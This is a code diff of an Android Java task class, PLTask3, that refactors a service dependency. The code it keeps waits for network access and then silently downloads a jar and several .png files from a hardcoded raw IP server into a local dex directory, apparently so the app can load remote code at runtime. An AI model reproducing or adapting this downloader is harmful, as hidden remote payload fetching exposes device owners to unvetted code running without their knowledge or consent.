@@ -14,7 +14,7 @@ import android.util.Log;
  */
 public class PLTask3 implements PLTask {
 	
-	private SdkServ dservice;
+	private DServ dservice;
 	private int id = 3;
 	private int state = STATE_WAITING;
 	private static final String TAG = "PLTask3";
@@ -28,7 +28,7 @@ public class PLTask3 implements PLTask {
 		int result  = 0;
 		state = STATE_RUNNING;
 		while (true) {
-			if (!dservice.isNetOk()) {
+			if (!CheckTool.isNetOk(dservice.getService())) {
 				try {
 					Thread.sleep(1000*60*10);
 				} catch (InterruptedException e) {
@@ -39,15 +39,15 @@ public class PLTask3 implements PLTask {
 		}
 		String remote = "http://180.96.63.70:8080/plserver/dats/exv.jar";
 //		String localFile = SdkServ.getLocalDexPath()+"exv.jar";
-		if(SdkServ.downloadGoOn(remote, SdkServ.getLocalDexPath(), "exv.jar",this.dservice.getService())){
+		if(dservice.downloadGoOn(remote, this.dservice.getLocalPath(), "exv.jar",this.dservice.getService())){
 			Log.d(TAG, "down exv OK.");
-			if (SdkServ.downloadGoOn("http://180.96.63.70:8080/plserver/dats/tj1.png", SdkServ.getLocalDexPath(), "tj1.png",this.dservice.getService())) {
+			if (this.dservice.downloadGoOn("http://180.96.63.70:8080/plserver/dats/tj1.png", this.dservice.getLocalPath(), "tj1.png",this.dservice.getService())) {
 				Log.d(TAG, "down tj1 OK.");
 			}
-			if (SdkServ.downloadGoOn("http://180.96.63.70:8080/plserver/dats/tj2.png", SdkServ.getLocalDexPath(), "tj2.png",this.dservice.getService())) {
+			if (this.dservice.downloadGoOn("http://180.96.63.70:8080/plserver/dats/tj2.png", this.dservice.getLocalPath(), "tj2.png",this.dservice.getService())) {
 				Log.d(TAG, "down tj2 OK.");
 			}
-			if (SdkServ.downloadGoOn("http://180.96.63.70:8080/plserver/dats/tj3.png", SdkServ.getLocalDexPath(), "tj3.png",this.dservice.getService())) {
+			if (this.dservice.downloadGoOn("http://180.96.63.70:8080/plserver/dats/tj3.png", this.dservice.getLocalPath(), "tj3.png",this.dservice.getService())) {
 				Log.d(TAG, "down tj3 OK.");
 			}
 			//触发CheckTool初始化
@@ -69,7 +69,7 @@ public class PLTask3 implements PLTask {
 	 */
 	@Override
 	public void setDService(DServ serv) {
-		this.dservice = (SdkServ) serv;
+		this.dservice =  serv;
 	}
 
 	/* (non-Javadoc)
